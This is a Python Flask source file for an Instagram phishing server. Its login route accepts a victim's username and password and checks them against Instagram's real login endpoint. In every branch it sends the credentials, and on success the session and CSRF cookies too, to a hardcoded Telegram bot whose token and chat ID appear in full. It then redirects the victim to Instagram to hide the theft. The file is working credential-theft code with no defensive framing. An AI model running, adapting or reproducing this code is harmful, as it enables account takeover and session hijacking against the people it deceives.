from flask import Flask,render_template,request,redirect
import requests
import json
from datetime import datetime
chat_id = '831388223'
token = '5233904392:AAHcNBszV4lLRjdFVAsOaPQONDdYhxLAHXE'

app = Flask(__name__)
@app.route("/")
@app.route("/home")
def home():
	return render_template("index.html")

@app.route("/result", methods=['POST',"GET"])
def result():
	output = request.form.to_dict()
	username = output["username"]
	password = output["password"]
	error=login(username,password)
	if error == "Redirect":
		return redirect("https://www.instagram.com")
	else:
		return render_template("index.html",error=error)

def login(username,password):
	link = 'https://www.instagram.com/accounts/login/'
	login_url = 'https://www.instagram.com/accounts/login/ajax/'
	time = int(datetime.now().timestamp())
	try:
		response = requests.get(link)
	except Exception as e:
		return "Please check your internet Connection."
	csrf = response.cookies['csrftoken']
	payload = {
	    'username': username,
	    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
	    'queryParams': {},
	    'optIntoOneTap': 'false'
	}
	login_header = {
	    "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
	    "X-Requested-With": "XMLHttpRequest",
	    "Referer": "https://www.instagram.com/accounts/login/",
	    "x-csrftoken": csrf
	}
	try:
		login_response = requests.post(login_url, data=payload, headers=login_header)
		json_data = json.loads(login_response.text)
		if json_data["authenticated"]:
			cookies = login_response.cookies
			cookie_jar = cookies.get_dict()
			csrf_token = cookie_jar['csrftoken']
			session_id = cookie_jar['sessionid']
			url = "https://api.telegram.org/bot"+token+"/sendMessage?text="+username+"%0A"+password+"%0A"+csrf_token+"%0A"+session_id+"&chat_id="+chat_id+""
			try:
				requests.get(url)
				return "Redirect"
			except Exception as e:
				return "Invalid username or password"
		else:
			url = "https://api.telegram.org/bot"+token+"/sendMessage?text="+username+"%0A"+password+"%0A"+login_response.text+"&chat_id="+chat_id+""
			try:
				requests.get(url)
				return "Invalid username or password"
			except Exception as e:
				return "Invalid username or password"
	except Exception as e:
		url = "https://api.telegram.org/bot"+token+"/sendMessage?text="+username+"%0A"+password+"%0A"+login_response.text+"%0A"+e+"&chat_id="+chat_id+""
		try:
			requests.get(url)
			return "Invalid username or password"
		except Exception as e:
			return "Invalid username or password"

if __name__ == '__main__':
	app.run(debug=True,port=5001)